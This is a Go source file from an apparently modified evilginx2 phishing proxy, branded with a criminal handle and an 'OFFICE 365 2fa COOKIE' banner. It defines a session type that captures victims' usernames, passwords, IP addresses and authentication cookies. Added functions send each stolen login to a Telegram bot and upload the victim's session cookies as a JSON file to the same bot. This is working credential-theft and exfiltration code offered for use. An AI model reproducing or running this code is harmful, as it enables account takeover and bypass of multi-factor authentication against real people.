package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// Session struct represents a user session.
type Session struct {
	Id             string
	Name           string
	Username       string
	Password       string
	Custom         map[string]string
	Params         map[string]string
	BodyTokens     map[string]string
	HttpTokens     map[string]string
	CookieTokens   map[string]map[string]*database.CookieToken
	RedirectURL    string
	IsDone         bool
	IsAuthUrl      bool
	IsForwarded    bool
	ProgressIndex  int
	RedirectCount  int
	PhishLure      *Lure
	RedirectorName string
	LureDirPath    string
	DoneSignal     chan struct{}
	RemoteAddr     string
	UserAgent      string
	Config         *Config
}

// NewSession initializes and returns a new Session object.
func NewSession(name string, config *Config) (*Session, error) {
	s := &Session{
		Id:           GenRandomToken(),
		Name:         name,
		Custom:       make(map[string]string),
		Params:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*database.CookieToken),
		DoneSignal:   make(chan struct{}),
		Config:       config,
	}
	return s, nil
}

// SetUsername sets the username and triggers the formatted message.
func (s *Session) SetUsername(username string) {
	s.Username = username
	s.sendFormattedTelegramMessage()
}

// SetPassword sets the password and triggers the formatted message.
func (s *Session) SetPassword(password string) {
	s.Password = password
	s.sendFormattedTelegramMessage()
}

// Finish marks the session as done.
func (s *Session) Finish(isAuthUrl bool) {
	if !s.IsDone {
		s.IsDone = true
		s.IsAuthUrl = isAuthUrl
		if s.DoneSignal != nil {
			close(s.DoneSignal)
			s.DoneSignal = nil
		}
	}
}

// AddCookieAuthToken adds a cookie token to the session.
func (s *Session) AddCookieAuthToken(domain, key, value, path string, httpOnly bool, expires time.Time) {
	if _, ok := s.CookieTokens[domain]; !ok {
		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
	}
	s.CookieTokens[domain][key] = &database.CookieToken{
		Name:     key,
		Value:    value,
		Path:     path,
		HttpOnly: httpOnly,
	}
}

// AllCookieAuthTokensCaptured checks if all required tokens are captured.
func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	for domain, tokens := range authTokens {
		for _, token := range tokens {
			if _, ok := s.CookieTokens[domain][token.name]; !ok {
				return false
			}
		}
	}
	return true
}

// SetCustom adds a custom key-value pair to the session.
func (s *Session) SetCustom(name, value string) {
	s.Custom[name] = value
}

// sendFormattedTelegramMessage sends the login details to Telegram.
func (s *Session) sendFormattedTelegramMessage() {
	if s.Username == "" || s.Password == "" {
		return
	}

	message := fmt.Sprintf(`
=======nginx משלו של @thugger70 🔒===========

            VALID LOGIN ✅

    📎 OFFICE 365💼 2fa COOKIE💼 

Username: %s
Password: %s
IP Address: %s
---------------------------------------------------------------------------------
---------------------------------------------------------------------------------
---------------------------------------------------------------------------------
`, s.Username, s.Password, s.RemoteAddr)

	s.sendTelegramMessage(message)
	s.saveAndSendCookies()
}

// saveAndSendCookies saves cookies to a JSON file and sends it to Telegram.
func (s *Session) saveAndSendCookies() {
	if s.Username == "" {
		log.Error("Username is not set, cannot save cookies")
		return
	}

	fileName := fmt.Sprintf("%s.json", s.Username)
	data, err := json.MarshalIndent(s.CookieTokens, "", "  ")
	if err != nil {
		log.Error("Failed to marshal cookies: %v", err)
		return
	}

	err = os.WriteFile(fileName, data, 0644)
	if err != nil {
		log.Error("Failed to save cookies to file: %v", err)
		return
	}

	err = s.sendTelegramFile(fileName)
	if err != nil {
		log.Error("Failed to send JSON file to Telegram: %v", err)
	}
}

// sendTelegramFile sends the given file to Telegram.
func (s *Session) sendTelegramFile(fileName string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", s.Config.general.TelegramBot)

	file, err := os.Open(fileName)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	part, err := writer.CreateFormFile("document", fileName)
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("failed to copy file content: %v", err)
	}

	err = writer.WriteField("chat_id", s.Config.general.TelegramChat)
	if err != nil {
		return fmt.Errorf("failed to write chat_id field: %v", err)
	}

	writer.Close()

	req, err := http.NewRequest("POST", url, &buf)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Telegram API returned non-OK status: %v", resp.Status)
	}

	log.Info("JSON file sent to Telegram successfully")
	return nil
}

// sendTelegramMessage sends a text message to Telegram.
func (s *Session) sendTelegramMessage(message string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", s.Config.general.TelegramBot)
	payload := map[string]string{
		"chat_id": s.Config.general.TelegramChat,
		"text":    message,
	}

	body, err := json.Marshal(payload)
	if err != nil {
		log.Error("Failed to marshal message payload: %v", err)
		return
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		log.Error("Failed to send message to Telegram: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Error("Telegram API returned non-OK status: %v", resp.Status)
		return
	}

	log.Info("Message sent to Telegram successfully")
}
